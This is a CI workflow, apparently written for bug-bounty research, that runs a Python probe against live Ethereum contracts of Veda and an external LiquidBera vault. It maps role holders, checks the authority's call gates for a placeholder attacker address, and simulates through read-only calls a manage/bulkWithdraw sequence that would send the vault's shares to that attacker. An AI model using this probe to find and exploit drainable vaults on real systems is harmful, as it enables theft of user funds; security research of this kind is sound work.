name: veda-liquidbera-deputy

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable
      - name: Reconstruct the external-vault transitive privilege graph
        shell: bash
        run: |
          python3 - <<'PY'
          import json, subprocess, time, urllib.parse, urllib.request, traceback

          CHAIN_ID=1
          RPCS=["https://ethereum-rpc.publicnode.com","https://eth.drpc.org","https://rpc.mevblocker.io"]
          ATTACKER="0x1111111111111111111111111111111111111111"
          ZERO="0x0000000000000000000000000000000000000000"
          USER_ROLE_TOPIC="0x4c9bdd0c8e073eb5eda2250b18d8e5121ff27b62064fbeeeed4869bb99bc5bf2"
          EXT={
            "vault":"0x83599937c2C9bEA0E0E8ac096c6f32e86486b410",
            "accountant":"0x04B8136820598A4e50bEe21b8b6a23fE25Df9Bd8",
            "teller":"0xd445C65e4821dbD4ed0114eCDF6325c69faD7653",
            "queue":"0xE2f6157656ed2BBBD87f1c01A29c1b92acb17476",
            "solver":"0x45D85C0A1168726Bbee2352D78E7647f70654d56",
            "manager":"0x62b283d4FeFB2a120e1120dba9f83bE6CA41bCD7",
            "authority":"0x5979F753b417c17FCd8f8c87b86154A0EB0E2c17",
            "timelock":"0x946F01f13eCafdbbd4CC2BDEd41703b3365b9D17",
          }
          VEDA={
            "vault":"0xf0bb20865277aBd641a307eCe5Ee04E79073416C",
            "teller":"0x9AA79C84b79816ab920bBcE20f8f74557B514734",
            "authority":"0x485Bde66Bb668a51f2372E34e45B1c6226798122",
            "queue":"0x0D2dF071207E18Ca8638b4f04E98c53155eC2cE0",
          }
          WEETH="0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee"

          def rpc(ep,m,p,t=35):
              b=json.dumps({"jsonrpc":"2.0","id":1,"method":m,"params":p}).encode();q=urllib.request.Request(ep,data=b,method="POST",headers={"content-type":"application/json","user-agent":"veda-liquidbera-deputy/1.0"})
              with urllib.request.urlopen(q,timeout=t) as r:o=json.loads(r.read().decode())
              if "error" in o:raise RuntimeError(o["error"])
              return o["result"]
          def choose():
              bad={}
              for ep in RPCS:
                  try:
                      if int(rpc(ep,"eth_chainId",[]),16)==CHAIN_ID:return ep,bad
                  except Exception as e:bad[ep]=repr(e)
              raise RuntimeError(bad)
          def http_json(url,t=45):
              q=urllib.request.Request(url,headers={"accept":"application/json","user-agent":"veda-liquidbera-deputy/1.0"})
              with urllib.request.urlopen(q,timeout=t) as r:return json.loads(r.read().decode())
          def run(*a):
              p=subprocess.run(list(a),text=True,capture_output=True);return {"ok":p.returncode==0,"stdout":p.stdout.strip(),"stderr":p.stderr.strip(),"returncode":p.returncode}
          def sig(s):return run("cast","sig",s)["stdout"].lower()
          def st(x):return x[2:] if str(x).startswith("0x") else str(x)
          def aw(a):return st(a).lower().rjust(64,"0")
          def sw(s):return st(s).lower().ljust(64,"0")
          def addr(x):return "0x"+st(x)[-40:].lower()
          def uint(x):return int(x,16) if x and x!="0x" else 0
          def boolean(x):return bool(uint(x))
          def push4(code):
              h=st(code);o=set();i=0
              while i+10<=len(h):
                  if h[i:i+2].lower()=="63":o.add("0x"+h[i+2:i+10].lower());i+=10
                  else:i+=2
              return sorted(o)
          def call(ep,to,data,frm=None):
              tx={"to":to,"data":data}
              if frm:tx["from"]=frm
              return rpc(ep,"eth_call",[tx,"latest"])
          def safe_call(ep,to,data,frm=None):
              try:return {"ok":True,"raw":call(ep,to,data,frm)}
              except Exception as e:return {"ok":False,"error":repr(e)}
          def routescan_logs(authority):
              params=urllib.parse.urlencode({"module":"logs","action":"getLogs","address":authority,"fromBlock":0,"toBlock":"latest","topic0":USER_ROLE_TOPIC,"page":1,"offset":1000})
              d=http_json(f"https://api.routescan.io/v2/network/mainnet/evm/1/etherscan/api?{params}");r=d.get("result")
              if isinstance(r,str):return []
              return r or []
          def gate(ep,auth,caller,target,selector):
              return boolean(call(ep,auth,S["canCall"]+aw(caller)+aw(target)+sw(selector)))

          S={
            "owner":sig("owner()"),"authority":sig("authority()"),"getUserRoles":sig("getUserRoles(address)"),"canCall":sig("canCall(address,address,bytes4)"),"isPublic":sig("isCapabilityPublic(address,bytes4)"),
            "manage1":sig("manage(address,bytes,uint256)"),"manageN":sig("manage(address[],bytes[],uint256[])"),"manageMerkle":sig("manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])"),
            "setRoot":sig("setManageRoot(address,bytes32)"),"root":sig("manageRoot(address)"),"bulkDeposit":sig("bulkDeposit(address,uint256,uint256,address)"),"bulkWithdraw":sig("bulkWithdraw(address,uint256,uint256,address)"),
            "balanceOf":sig("balanceOf(address)"),"totalSupply":sig("totalSupply()"),"name":sig("name()"),"symbol":sig("symbol()"),"threshold":sig("getThreshold()"),"owners":sig("getOwners()"),
            "modules":sig("getModulesPaginated(address,uint256)"),"schedule":sig("schedule(address,uint256,bytes,bytes32,bytes32,uint256)"),"executeTimelock":sig("execute(address,uint256,bytes,bytes32,bytes32)"),
          }
          ARBITRARY=["manage(address,bytes,uint256)","manage(address[],bytes[],uint256[])","manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])","execute(address,uint256,bytes)","execute(address,uint256,bytes,bytes32,bytes32)","executeBatch(address[],uint256[],bytes[],bytes32,bytes32)","multicall(bytes[])","execTransactionFromModule(address,uint256,bytes,uint8)"]
          ep,bad=choose();block=int(rpc(ep,"eth_blockNumber",[]),16)
          out={"generated_at_unix":int(time.time()),"block":block,"endpoint":ep,"rpc_failures":bad,"addresses":EXT,"veda":VEDA,"holders":{},"direct_gates":{},"candidate_paths":[],"errors":[]}

          # Direct transitive gates and funds currently held in the in-scope vault.
          out["liquidbera_liquideth_share_balance"]=uint(call(ep,VEDA["vault"],S["balanceOf"]+aw(EXT["vault"])))
          out["liquidbera_weeth_balance"]=uint(call(ep,WEETH,S["balanceOf"]+aw(EXT["vault"])))
          out["liquidbera_total_supply"]=uint(call(ep,EXT["vault"],S["totalSupply"]))
          for label,auth,caller,target,sel in [
              ("attacker_ext_vault_manage1",EXT["authority"],ATTACKER,EXT["vault"],S["manage1"]),
              ("attacker_ext_vault_manageN",EXT["authority"],ATTACKER,EXT["vault"],S["manageN"]),
              ("attacker_ext_manager_merkle",EXT["authority"],ATTACKER,EXT["manager"],S["manageMerkle"]),
              ("ext_manager_ext_vault_manage1",EXT["authority"],EXT["manager"],EXT["vault"],S["manage1"]),
              ("ext_vault_veda_bulkDeposit",VEDA["authority"],EXT["vault"],VEDA["teller"],S["bulkDeposit"]),
              ("ext_vault_veda_bulkWithdraw",VEDA["authority"],EXT["vault"],VEDA["teller"],S["bulkWithdraw"]),
              ("attacker_veda_bulkWithdraw",VEDA["authority"],ATTACKER,VEDA["teller"],S["bulkWithdraw"]),
          ]:
              try:out["direct_gates"][label]={"canCall":gate(ep,auth,caller,target,sel),"public":boolean(call(ep,auth,S["isPublic"]+aw(target)+sw(sel)))}
              except Exception as e:out["direct_gates"][label]={"error":repr(e)}
          for who in (ATTACKER,EXT["manager"],EXT["vault"],EXT["teller"],EXT["solver"]):
              out.setdefault("manage_roots",{})[who.lower()]=safe_call(ep,EXT["manager"],S["root"]+aw(who))

          logs=routescan_logs(EXT["authority"]);users=set();events=[]
          for log in logs:
              topics=[str(x).lower() for x in (log.get("topics") or [])]
              if len(topics)<3:continue
              u=addr(topics[1]);role=int(st(topics[2]) or "0",16);enabled=bool(int(st(log.get("data","0x")) or "0",16));users.add(u);events.append({"user":u,"role":role,"enabled":enabled,"block":int(log.get("blockNumber","0x0"),16)})
          authority_owner=addr(call(ep,EXT["authority"],S["owner"]));users.add(authority_owner);out["authority_owner"]=authority_owner;out["event_count"]=len(events);out["events"]=events
          known={x.lower() for x in EXT.values()}
          for u in sorted(users):
              try:roles=uint(call(ep,EXT["authority"],S["getUserRoles"]+aw(u)))
              except Exception as e:out["holders"][u]={"roles_error":repr(e)};continue
              if roles==0 and u!=authority_owner:continue
              code=rpc(ep,"eth_getCode",[u,"latest"]);sels=push4(code);h={"roles":roles,"code_bytes":len(st(code))//2,"push4":sels,"known":u in known,"critical":{},"arbitrary_surface":{x:sig(x) in sels for x in ARBITRARY}}
              for target_name,target,selname in [("vault.manage1",EXT["vault"],"manage1"),("vault.manageN",EXT["vault"],"manageN"),("manager.manageMerkle",EXT["manager"],"manageMerkle"),("manager.setRoot",EXT["manager"],"setRoot")]:
                  try:h["critical"][target_name]=gate(ep,EXT["authority"],u,target,S[selname])
                  except Exception as e:h["critical"][target_name]={"error":repr(e)}
              if h["code_bytes"]:
                  for qn,qs in [("owner",S["owner"]),("authority",S["authority"]),("threshold",S["threshold"]),("owners",S["owners"])]:h[qn]=safe_call(ep,u,qs)
                  h["attacker_calls"]={
                    "manage1":safe_call(ep,u,S["manage1"]+aw(VEDA["teller"])+hex(96)[2:].rjust(64,"0")+hex(0)[2:].rjust(64,"0")+hex(4)[2:].rjust(64,"0")+st(S["bulkWithdraw"]).ljust(64,"0"),ATTACKER),
                    "manageMerkleEmpty":safe_call(ep,u,S["manageMerkle"]+hex(160)[2:].rjust(64,"0")*5+hex(0)[2:].rjust(64,"0")*5,ATTACKER),
                  }
                  for n,r in h["attacker_calls"].items():
                      if r.get("ok"):out["candidate_paths"].append({"holder":u,"call":n,"result":r})
              out["holders"][u]=h

          # Direct low-level attacker simulation against the external BoringVault.
          bulk_data=run("cast","calldata","bulkWithdraw(address,uint256,uint256,address)",WEETH,out["liquidbera_liquideth_share_balance"],0,ATTACKER)["stdout"]
          manage_data=run("cast","calldata","manage(address,bytes,uint256)",VEDA["teller"],bulk_data,0)["stdout"]
          out["attacker_direct_manage_simulation"]=safe_call(ep,EXT["vault"],manage_data,ATTACKER)

          with open("veda-liquidbera-deputy.json","w",encoding="utf-8") as f:json.dump(out,f,indent=2,sort_keys=True);f.write("\n")
          print(json.dumps({"block":block,"share_balance":out["liquidbera_liquideth_share_balance"],"direct_gates":out["direct_gates"],"candidate_paths":out["candidate_paths"],"holders":{u:{"roles":h.get("roles"),"bytes":h.get("code_bytes"),"critical":h.get("critical"),"surfaces":[k for k,v in h.get("arbitrary_surface",{}).items() if v],"attacker_calls":{k:v.get("ok") for k,v in h.get("attacker_calls",{}).items()}} for u,h in out["holders"].items()}},indent=2,sort_keys=True))
          PY
      - name: Upload transitive privilege proof
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: veda-liquidbera-deputy
          path: veda-liquidbera-deputy.json
          if-no-files-found: error
          retention-days: 1
